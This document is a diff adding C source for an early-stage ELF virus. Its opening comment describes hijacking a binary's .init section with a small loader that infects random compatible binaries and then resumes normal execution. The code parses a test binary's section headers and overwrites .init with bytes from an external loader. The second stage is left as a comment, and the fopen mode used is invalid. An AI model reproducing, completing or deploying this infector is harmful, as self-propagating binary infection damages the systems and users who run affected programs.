@@ -1,0 +1,79 @@
+////////////////////////////////////////////////////////////////////////////////
+// THE SCOTCH-WARE LICENSE (Revision 0):
+// <aaronryool/gmail.com> wrote this file. As long as you retain this notice you
+// can do whatever you want with this stuff. If we meet some day, and you think
+// this stuff is worth it, you can buy me a shot of scotch in return
+////////////////////////////////////////////////////////////////////////////////
+//
+// The idea is basically to hijack the .init section, use the 27 bytes of
+// __init for the first stage loader, which will set up the environment for stage
+//  two, which will save the state of the program entry, randomly search for a 
+// binary to latch onto, infect a random compatible binary, and then clean up, 
+// restore the entry state, jmp into a reimplementation of __init, and continue
+// normal program execution...
+
+
+#include <string.h>
+#include <malloc.h>
+#include <stdio.h>
+#include <elf.h>
+
+typedef struct target {
+    Elf64_Ehdr* eheader;
+    Elf64_Shdr* sheader;
+    Elf64_Phdr* pheader;
+    char* shstable;
+} target_t;
+
+
+// code in payload.s
+extern const void* loader;
+
+int main(int argc, char** argv)
+{
+    target_t target;
+
+    // open test binary
+    FILE* file = fopen("./yay", "rw+");
+
+    // read in its elf header
+    target.eheader = malloc(sizeof(Elf64_Ehdr));
+    fread(target.eheader, sizeof(Elf64_Ehdr), 1, file);
+
+    // see to section header offset
+    fseek(file, target.eheader->e_shoff, SEEK_SET);
+
+    // read in section header
+    target.sheader = malloc(sizeof(Elf64_Shdr) * target.eheader->e_shnum);
+    fread(target.sheader, sizeof(Elf64_Shdr), target.eheader->e_shnum, file);
+
+
+    // read in section header string table section header entry
+    Elf64_Shdr* stsh = target.sheader + target.eheader->e_shstrndx;
+
+    // seek to the string table itself
+    fseek(file, stsh->sh_offset, SEEK_SET);
+
+    // read in the section header strings table
+    target.shstable = malloc(stsh->sh_size);
+    fread(target.shstable, stsh->sh_size, 1, file);
+
+    // search for the ".init" section
+    for(int i = 0;i < target.eheader->e_shnum;i++, target.sheader++)
+    {
+        char* name = target.shstable + target.sheader->sh_name;
+        if(strcmp(name, ".init") == 0)
+        {
+            // rudely shove the loader into .init, and print out stuff about it
+            printf("%s: offset: %lx, size: %li\n", name, target.sheader->sh_offset, target.sheader->sh_size);
+            fseek(file, target.sheader->sh_offset, SEEK_SET);
+            fwrite(&loader, 1, 8, file);
+        }
+    }
+    // seek to end of file
+    fseek(file, 0, SEEK_END);
+
+    // write the stage two object to the end of the file, and prepare it for its new host
+
+    return 0;
+}
